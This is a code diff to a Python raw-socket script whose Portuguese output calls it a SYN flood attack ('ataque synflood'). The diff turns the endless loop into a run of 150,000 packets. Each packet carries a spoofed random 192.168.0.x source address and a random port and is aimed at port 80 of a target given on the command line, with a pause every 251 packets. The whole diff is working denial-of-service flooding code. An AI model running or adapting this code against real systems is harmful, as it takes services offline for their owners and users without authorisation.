@@ -105,12 +105,16 @@ except socket.error , msg:
     print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
     sys.exit()
 
-port_num = 10000
 porta_destino = 80
 print sys.argv[1]
-while (1):
-    packet = makePacote("192.168.0.106", sys.argv[1], port_num%65535, porta_destino)
+contador = 0
+while (contador < 150000):
+    port_num = randint(49152,65535)
+    ip_local ='192.168.0.' + str(randint(1,254))
+    packet = makePacote(ip_local, sys.argv[1], port_num, porta_destino)
     #Send the packet finally - the port specified has no effect
     s.sendto(packet, (sys.argv[1] , 0 ))    # put this in a loop if you want to flood the target
-    port_num += 1
+    if contador%251 == 250:
+        time.sleep(10)
 
+print 'Encerrando ataque synflood'
